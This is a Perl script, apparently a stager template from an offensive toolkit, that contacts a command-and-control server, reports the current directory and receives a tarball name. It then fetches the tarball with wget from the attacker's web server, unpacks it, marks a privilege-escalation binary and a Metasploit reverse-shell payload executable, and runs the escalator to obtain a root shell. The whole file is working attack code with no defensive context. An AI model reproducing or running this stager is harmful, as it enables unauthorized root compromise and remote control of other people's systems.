#!/usr/bin/perl

$| =1;
use strict;
use IO::Socket::INET;

my %Commands = (
    "untar"      => "tar zxvf %s",
    "enableExe"  => "chmod a+x %s",
    "runCommand" => "bash -c \"%s\"",
    "wget"    => "wget %s %s:%s/%s",
    );

my %Params = (
    __CLIENT_PARAMETERS__
    'commands' => \%Commands,
    );

#BEGIN CODE

ReturnElevatedShell(\%Params);

sub ReturnElevatedShell
{
    my $conf = shift;
    
    # inform C2 server of local cwd, get name of tarball to download

    InitiateContact($conf);

    # get tarball from webserver, unpack

    GetTarball($conf);

    # set correct permissions, execute

    UnpackExecute($conf);

    # TODO: cleanup afterwards

    
}

sub InitiateContact
{
    my $conf = shift;
    
    my $PeerSocket = sprintf("%s:%s",$conf->{Server},$conf->{PerlPort});

    my $socket = new IO::Socket::INET(
	PeerAddr => $PeerSocket,
	Reuse => 1,
	) || die "Connection error: $@\n";
    
    $conf->{cwd} = `pwd`;

    $conf->{cwd} =~ s/[\n\r]//gs;

    $socket->send(
	sprintf("PWD:%s\n",$conf->{cwd})
	);

    while ($socket->recv(my $data,1024))
    {
	if ((my $URI) = $data =~ /^GET:(.*?$)/s)
	{
	    $conf->{TarballURI} = $URI;
	}
     
    }
}

sub GetTarball
{
    my $conf = shift;
    my $com = $conf->{commands};
    
    sys_exec($com->{wget},$conf->{WebOptions},$conf->{Server},$conf->{WebPort},$conf->{TarName});
}
sub UnpackExecute
{
    my $conf = shift;
    my $com = $conf->{commands};
    
    sys_exec($com->{untar},$conf->{TarName});

    my $FullElevatorPath = $conf->{cwd}."/".$conf->{TarDir}."/".$conf->{ElevatorName}; 
    my $FullPayloadPath = $conf->{cwd}."/".$conf->{TarDir}."/".$conf->{MSF_Payload};
    
    # make sure both elevation binary and reverse shell payload are executable!

    sys_exec($com->{enableExe},$FullElevatorPath);
    sys_exec($com->{enableExe},$FullPayloadPath);

    # execute elevation binary which will return root shell

    sys_exec($com->{runCommand},$FullElevatorPath);

}


sub sys_exec
{
    my $command_string = shift;
    my $Command = sprintf($command_string,@_);
    printf("Executing: %s\n",$Command);
    system($Command);
}
